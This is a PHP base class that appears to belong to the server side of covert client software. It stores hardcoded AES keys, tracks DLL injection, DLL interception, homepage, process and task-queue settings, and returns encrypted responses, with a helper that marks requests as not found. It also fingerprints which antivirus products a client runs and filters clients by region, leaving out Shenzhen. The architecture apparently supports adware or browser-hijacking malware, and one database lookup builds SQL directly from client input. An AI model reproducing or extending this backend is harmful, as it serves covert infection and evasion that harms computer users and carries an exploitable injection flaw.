<?php
namespace app;

class Common
{
	public $key1 = array(0x10, 0x8B, 0x44, 0x24, 0x10, 0x83, 0xC0, 0xF4, 0x50, 0xE8, 0xBE, 0x47, 0x03, 0x7D, 0x83, 0xC4, 
	                   0x04, 0x8D, 0x4C, 0x24, 0x34, 0x89, 0x9C, 0x24, 0x60, 0x04, 0x5C, 0x69, 0xE8, 0x0F, 0x9D, 0x02);
	public $key2 = array(0x56, 0x8B, 0xF1, 0x57, 0x33, 0xFF, 0x8B, 0x06, 0x3B, 0xC7, 0x74, 0x0B, 0x50, 0xE8, 0xB4, 0xFD, 
	                   0x03, 0x93, 0x83, 0xC4, 0x04, 0x89, 0x3E, 0x89, 0x7E, 0x04, 0x89, 0x7E, 0x08, 0x5F, 0x5E, 0xC3);

	public $mykey = 'MYgGnQE2jDFADSFFDSEWsD';
	public $myiv = 'qWeR1234Asdf5678';
	public $db = null;
	public $macDao = null;
	public $brlogDao = null;
	public $pclogDao = null;
	public $softconfigDao = null;
	public $taskqueueDao = null;
	public $channelDao = null;
	public $softDao = null;
	public $whitelDao = null;
	public $urlrDao = null;
	public $uidpathDao = null;
	public $maccurtimeDao = null;
	public $areaDao = null;
	public $antivirusDao = null;
	public $browsersDao = null;
	public $extserstateDao = null;
	public $errorlogDao = null;
	public $dllconfigDao = null;
	public $taskqueueusecountDao = null;
	public $mutiplebrlogDao = null;
	public $dllinjectDao = null;
	public $appsoftwareDao = null;
	public $processDao = null;
	public $redis = null;
	public $is_404 = false;
	public $processconfigDao = null;
	public $dldasDao = null;
	public $sysdllinjectDao = null;
	public $sysappsoftwareDao = null;
	public $systaskqueueDao = null;
	public $parentprocessDao = null;
	public $dllinterceptDao = null;
	
	function send404()
	{
		header('HTTP/1.1 404 Not Found'); 
		header("status: 404 Not Found");
		$this->is_404 = true;
	}

	//数据解密
	function get_param_arr($param)
	{
		$Aes = new \extend\Aes();

		$json_param = $this->param_filter($Aes->decrypt($param, $this->key1, $this->key2));
		$param_arr = json_decode($json_param, true);
		if($param_arr == null)
		{
//			file_put_contents('param_null.log', $json_param."\r\n", FILE_APPEND);
		}
		return $param_arr;
	}

	//过滤解密后的不规则字符
	function param_filter($json_str)
	{
		// $json_str = iconv('GB2312', 'UTF-8//IGNORE', $json_str);
		$json_str = mb_convert_encoding($json_str, "UTF-8", "GBK");
		$json_str = str_replace("\r", "", $json_str);
		$json_str = str_replace("\n", "", $json_str);
		$json_str = str_replace("\t", "", $json_str);
		$json_str = str_replace("\\", "\\\\", $json_str);
		//$json_str = preg_replace("/\"RealHomePage\":\"\"(.+)\"(.*)\",/", "\"RealHomePage\":\"\\\"$1\\\"$2\",", $json_str);
		$rp = preg_match_all("/\"RealHomePage\":\"(.*)\",/", $json_str, $rp_arr);
		if(isset($rp_arr[1][0]))
		{
	        $rp_str = str_replace("\"", "\\\"", $rp_arr[1][0]);
	        $json_str = str_replace($rp_arr[1][0], $rp_str, $json_str);
		}
		$json_str = trim($json_str, chr(0xa0));
		$c = substr($json_str, -1);
		$a = ord($c);
		if($a == 16)
		{
			$json_str = substr($json_str, 0, -16);
		}

		return $json_str;
	}

	function db_init()
	{
		$this->db = new \extend\Database();
	}

	function return_json($json_arr = array(), $redis_key = '')
	{
		$return_param = json_encode($json_arr,JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
		//对返回参数加密
		$return_param = str_replace('\\\\', '\\', $return_param);
		$return_param = iconv("UTF-8", "GB2312//IGNORE", $return_param);
		if($redis_key != '')
		{
			if(!$this->redis)
			{
				$this->redis = new \extend\Redis();
			}
			$encrypt_str = $this->redis->get($redis_key);
			if(!$encrypt_str)
			{
				$Aes = new \extend\Aes();
				$encrypt_str = $Aes->encrypt($return_param, $this->key1, $this->key2);
				$this->redis->set($redis_key, $encrypt_str, 3600);
			}
		}
		else
		{
			$Aes = new \extend\Aes();
			$encrypt_str = $Aes->encrypt($return_param, $this->key1, $this->key2);
		}
		// file_put_contents('log.txt', $encrypt_str);
		// echo $encrypt_str;
		// header("Content-type:text/html;charset=utf-8");
		// HttpResponse::setBufferSize(10240);
		header("HTTP/1.0 200 OK");
		print_r($encrypt_str);
	}

	function getIP(){
		if (getenv("HTTP_CLIENT_IP"))
			$ip = getenv("HTTP_CLIENT_IP");
		else if(getenv("HTTP_X_FORWARDED_FOR"))
			$ip = getenv("HTTP_X_FORWARDED_FOR");
		else if(getenv("REMOTE_ADDR"))
			$ip = getenv("REMOTE_ADDR");
		else $ip = "Unknow";
		return ip2long($ip);
	}

	function is_ip_ok($ips, $ip)
	{
		$ips_arr = explode('|', $ips);
		if(!$ip || !in_array($ip, $ips_arr))
		{
			return false;
		}
		return true;
	}

	function is_area_ok($area, $area_arr)
	{
		$area_ok = false;
		if($area != '未知')
		{
			foreach ($area_arr as $key => $o) {
				if(strstr($area, $o))
				{
					if($o == '广东省')
					{
						//如果配置了广东省，就要不是深圳市的才通过
						if($area != '广东省深圳市')
						{
							$area_ok = true;
						}
					}
					else
					{
						//如果配置了其他（包括深圳市）那就直接判断是否存在这个地名
						$area_ok = true;
					}
				}
				if($o == '海外')
				{
					//如果选择了海外，就判断所属地区，是否在所有省份
					$is_outsea = true;
					$this->areaDao = new \model\Area();
					$country = $this->areaDao->select('reid=0');
					foreach ($country as $key1 => $p) {
						if(strstr($area, $p['name']))
						{
							//如果有在某个省份，就说明不是海外
							$is_outsea = false;
							break;
						}
					}
					//如果最后没有匹配的省份，就说明属于海外
					if($is_outsea)
					{
						$area_ok = true;
					}
				}
				if($area_ok) break;
			}
		}

		return $area_ok;
	}
    public function get_area_by_ip($ip)
    {
    	// $ip = '222.179.239.17';
    	// if($ip == '110.86.39.225')
    		// $ip = '8.8.8.8';
        $model = new \extend\IpLocation2();
        $area2 = $model->getlocation($ip);

        return iconv("GB2312", "UTF-8//IGNORE", $area2['country']);
    }
	/*
	 * 下载的链接生成的唯一数
	 * $url : return string 下载的链接
	 * @param int 随机数
	 */
	public function uid($filename){
		$uid =uniqid();

		if(!$this->uidpathDao)
		{
			$this->uidpathDao = new \model\Uidpath();
		}
		$this->uidpathDao->insert(array('uid'=>$uid, 'path'=>$filename));
		return $uid;
	}

	function antivirus_to_antivirusid($antivirus)
	{
		$antivirus_arr = explode('|', $antivirus);
		$id_arr = array();
		foreach ($antivirus_arr as $key => $o) {
			$id_arr[] = $this->get_antivirusid($o);
		}
		sort($id_arr);
		$id_str = '';
		foreach ($id_arr as $key => $o) {
			$id_str .= $o;
		}
		return $id_str;
	}

	function get_antivirusid($name)
	{
		$redis = new \Redis();
		$redis->pconnect('127.0.0.1', 6379);
		$id = $redis->get('antivirus_id_by_name_'.$name);
		if(!$id)
		{
			$this->antivirusDao = new \model\Antivirus();
			$data = $this->antivirusDao->find("antivirus='$name'");
			if($data)
			{
				$id = $data['id'];
				$redis->set('antivirus_id_by_name_'.$name, $id);
			}
			else
			{
				$id = 0;
			}
		}
		return $id;
	}

	function get_browserid($browser)
	{
		if(!$this->browsersDao)
		{
			$this->browsersDao = new \model\Browsers();
		}

		$browserid = $this->browsersDao->get_id_by_browser($browser);

		if($browserid)
		{
			return $browserid;
		}
		else
		{
			return 0;
		}
	}

	function get_download_path($path)
	{
		// $uid = uniqid();
		$mtime = floor(microtime()*1000);
		if($mtime < 100 && $mtime >= 10)
		{
			$mtime = '0'.$mtime;
		}
		else if($mtime < 10)
		{
			$mtime = '00'.$mtime;
		}
		$time_now = time();
		$uid = $time_now.$mtime;
		$str = $uid.$time_now.$path;

		$key = base64_decode($this->mykey);
		$iv = base64_decode($this->myiv);
		$str1 =  mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $str, MCRYPT_MODE_ECB, $iv);
		$encrypt_str =  mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $str1, MCRYPT_MODE_ECB, $iv);
		$encrypt_str = base64_encode($encrypt_str);
		return $encrypt_str;
	}

	function add_error_log($action_name, $mac, $ip, $request, $result, $error_text)
	{
		// return false;
		if(!$this->errorlogDao)
		{
			$this->errorlogDao = new \model\Errorlog();
		}

		$add_data = array();
		$add_data['action'] = $action_name;
		$add_data['mac'] = $mac;
		$add_data['ip'] = $ip;
		$add_data['request'] = $request;
		$add_data['result'] = $result;
		$add_data['text'] = $error_text;
		$add_data['addtime'] = time();
		$id = $this->errorlogDao->insert($add_data);
	}

	function log_to_file($filename, $text)
	{
		if(time() > 1501903986)
		{
			return false;
		}
		$text = date('Y-m-d H:i:s').' '.$text."\r\n";

		$file_path = 'log/'.$filename;
		if(!is_dir('log'))
		{
			mkdir('log');
		}

		file_put_contents($file_path, $text, FILE_APPEND);
	}

	function my_log()
	{
	}
}
?>
